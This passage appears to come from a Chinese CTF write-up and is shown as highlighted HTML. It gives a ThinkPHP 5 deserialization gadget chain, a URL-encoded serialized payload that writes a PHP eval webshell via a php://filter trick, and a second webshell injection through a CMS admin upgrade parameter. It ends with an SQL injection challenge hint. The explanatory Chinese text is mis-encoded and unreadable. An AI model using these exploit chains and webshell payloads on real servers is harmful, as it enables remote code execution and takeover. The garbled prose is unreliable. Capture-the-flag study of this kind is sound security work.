&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;getError&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//Ë∞ÉÁî®getError ËøîÂõûthis-&amp;gt;error
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $this-&amp;gt;error Ë¶Å‰∏∫ relationÁ±ªÁöÑÂ≠êÁ±ªÔºåÂπ∂‰∏î‰πüÊòØOnetoOneÁ±ªÁöÑÂ≠êÁ±ª==&amp;gt;&amp;gt;HasOne
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Pivot&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">parent&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HasOne&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$selfRelation&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">selfRelation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$queryÊåáÂêëQuery
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#75715e">// $valueÂÄºÔºå‰Ωú‰∏∫callÂáΩÊï∞ÂºïÁî®ÁöÑÁ¨¨‰∫åÂèòÈáè
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\db&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Query&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Output&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$styles&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">styles&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;getAttr&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\session\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcached&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handler&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\cache\driver\File
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\cache\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">File&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$tag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;expire&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cache_subdir&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;prefix&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;data_compress&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$Memcached&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\session\driver\Memcached&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\think\cache\driver\File&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$Output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\console\Output&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Memcached&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\db\Query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$HasOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\relation\HasOne&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$window&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\process\pipes\Windows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\Pivot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$HasOne&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏ä‰º†&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
&lt;/code>&lt;/pre>&lt;p>ËôΩÁÑ∂‰ºöËøîÂõû‰∏Ä‰∏™Êä•ÈîôÁöÑÈ°µÈù¢Ôºå‰ΩÜÊòØÂèØ‰ª•Âú®&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>Â§ÑÈ™åËØÅ‰∏Ä‰∏ãÊòØÂê¶ÂÜô‰∏ä‰∫ÜüêéÔºåÊñá‰ª∂ÂêçÂ≠óÊòØ&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>ÔºåËøûÊé•ÂØÜÁ†ÅÊòØccc Áõ¥Êé•ËöÅÂâë&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
&lt;p>Âú®&lt;a href="http://www.snowywar.top/?p=2424">Èõ™ÊÆáÁöÑwp&lt;/a>‰∏≠Áî®ÁöÑÊòØÂè¶‰∏Ä‰∏™ÔºåÊõ¥Áõ¥Êé•ÁöÑÂÜôüêéÊñπÂºèÔºå‰∏ãÈù¢ËØ¥‰∏Ä‰∏ãÊÄùË∑ØÔºàÂ§ßÊ¶Ç&lt;/p>
&lt;p>Êàë‰ª¨ÂèØ‰ª•ÂÖàÂ∞ùËØïÁúãÁúãÊïèÊÑüÂáΩÊï∞file_put_contents()ÊòØÂê¶ËÉΩÂà©Áî®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png" alt="image-20210804212231467">&lt;/p>
&lt;p>Âú®&lt;code>application/admin/controller/Upgrade.php&lt;/code>‰∏ãÁúãÂà∞‰∫ÜÊñá‰ª∂ÂÜôÂÖ•ÁöÑÂáΩÊï∞ÔºåÂÆÉ‰Ωç‰∫éÂú®&lt;code>writelog()&lt;/code>‰∏≠ÔºåËøô‰∏™ÂáΩÊï∞ÁöÑÂäüËÉΩÊòØÂ§ÑÁêÜpostËØ∑Ê±Ç‰º†ÂÖ•ÁöÑÂêÑÈ°πÂèÇÊï∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png" alt="image-20210804212743633">&lt;/p>
&lt;p>Ëøô‰∏™&lt;code>config('client_upgrade_edition')&lt;/code>ÊçèÔºåË∑ü‰∫Ü‰∏Ä‰∏ã ÂÆÉ‰ºöËøîÂõûnullÔºåÂÜçÂæÄ‰∏äÁúãÂà∞&lt;code>_initialize()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png" alt="image-20210805140607537">&lt;/p>
&lt;p>ÊâÄ‰ª•ÊúÄÂêéÊòØ‰ºöÂ∞Ü$upgrade_editionÂÜôÂÖ•‰∏≠&lt;code>/runtime/client_upgrade_edtion.php&lt;/code>‰∏≠ÔºõËÄåÊï¥‰∏™writelog()ÂáΩÊï∞‰ºöË¢´sysup()Ë∞ÉÁî®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png" alt="image-20210804213858768">&lt;/p>
&lt;p>Ë∑üËøõËøô‰∏™sysup()Âíå$upgrade_edtionÔºåÁúãÊòØÂê¶ÂèØÁî®+Â¶Ç‰ΩïÁî®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png" alt="image-20210804220616726">&lt;/p>
&lt;p>Âú®&lt;code>template/admin_style/default/admin/upgrade/index.htm&lt;/code>‰∏ãÁúãÂà∞‰∫ÜÁ°ÆÂÆûÂ≠òÂú®ÁöÑË∑ØÁî±ÔºåËøô‰∏™ÁöÑÈ°µÈù¢ÊòØÂú®ÂêéÂè∞ÁÆ°ÁêÜ‰∏≠ÂøÉ - Á≥ªÁªüÂäüËÉΩ - Á≥ªÁªüÂú®Á∫øÂçáÁ∫ßÂ§ÑÔºåÈöè‰æøÂçá‰∏Ä‰∏™ÁúãÁúã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
&lt;p>ÊäìÂåÖ‰πãÂêéÁúãÂà∞ËøôÈáåÁ°ÆÂÆûÊúâpostËÆøÈóÆÂíåupgrade_edtionÂèÇÊï∞ÔºåÈÇ£Â∞±Á®≥‰∫ÜÔºåÁõ¥Êé•ÂÜôüêé&lt;/p>
&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
&lt;p>Â∞ÜüêéÂÜôËøõÁöÑÁõÆÊ†áÈ°µÈù¢&lt;code>/runtime/client_upgrade_edition.php&lt;/code>ËøûÂÖ•ËöÅÂâë ÊãøflagÂç≥ÂèØ&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊØîËµõÁöÑÊó∂ÂÄôÊàëÂÖ∂ÂÆûÊòØÊ≤°ÊúâÊêúÂà∞&lt;a href="https://ma4ter.cn/2527.html">ÈΩêÂçöÂª∫Á´ôÁ≥ªÁªüx1.0‰ª£Á†ÅÂÆ°ËÆ°&lt;/a>ËøôÁØáÁöÑÔºåÂΩìÊó∂ÊÄùË∑ØÊòØÂú®ÂêéÂè∞Âú®ÊâæÊúâÊ≤°ÊúâÂèØ‰ª•Âà©Áî®ÁöÑÂú∞ÊñπÁõ¥Êé•ÂÜôüêé ÔºåÂΩìÊó∂ÊâæÁöÑÊòØÁã¨Á´ãÈ°µÁÆ°ÁêÜÔºåÂ∞ùËØïuploadÔºå‰ΩÜÊòØÂπ∂‰∏çÂ§™Ë°åÔºà‰πüÂèØËÉΩÊòØÊàëÂ§™Ëèú‰∫ÜÔºâÔºåÁÑ∂Âêé‰πüÊ≤°ÂéªÂÆ°‰ª£Á†ÅÔºàÊáíÁãóÔºâÊâÄ‰ª• Â∞±Ê≤°Âá∫Ëøô‰∏™È¢òÔºåÁé∞Âú®ÁúãËøòÊòØÁñèÂøΩ‰∫Ü Á°ÆÂÆûÂÆåÂÖ®Ê≤°Ê≥®ÊÑèÂà∞Á≥ªÁªüÂú®Á∫øÂçáÁ∫ßËøô‰∏™Ê®°ÂùóÊòØÂèØÁî®ÁöÑ ‰πüÊ≤°ÊúâËÆ§ÁúüÁöÑÂàÜÊûêÊ∫êÁ†Å ÊàëÁöÑËøá&lt;/p>
&lt;h2 id="ÂÆâÂÖ®ÂÆâÂÖ®ËøòÊòØxxxÁöÑÂÆâÂÖ®">ÂÆâÂÖ®,ÂÆâÂÖ®,ËøòÊòØxxxÁöÑÂÆâÂÖ®&lt;/h2>
&lt;blockquote>
&lt;p>Êüê‰∏™ÁâπÂà´ÂÆâÂÖ®ÁöÑÂïÜÂ∫ó&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span> &lt;span style="color:#00a8c8">NOT&lt;/span> &lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span> &lt;span style="color:#00a8c8">UNIQUE&lt;/span> &lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;login_password&amp;#34;&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;money&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;pay_password&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flag_num&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#00a8c8">PRIMARY&lt;/span> &lt;span style="color:#00a8c8">KEY&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;flaaaaaaaaag&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flllllllag&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>ÁâπÂà´ÁÆÄÈôãÁöÑÂâçÁ´ØÔºåÊúâÁôªÂΩïÂíåÊ≥®ÂÜåÂíå‰∏ªÈ°µ‰∏â‰∏™È°µÈù¢ÔºåÁôªÂΩïÂ§ÑÊúâ‰∏ÄÂÆöËøáÊª§ Â≠òÂú®sqli&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png" alt="image-20210801133701306">&lt;/p>
&lt;p>‰ªªÊÑèÊ≥®ÂÜåË¥¶Âè∑ÔºåËµ∞‰∏ÄÊ≥¢ÊµÅÁ®ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png" alt="image-20210801133748445">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png" alt="image-20210801133808970">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png" alt="image-20210801133825487">&lt;/p>
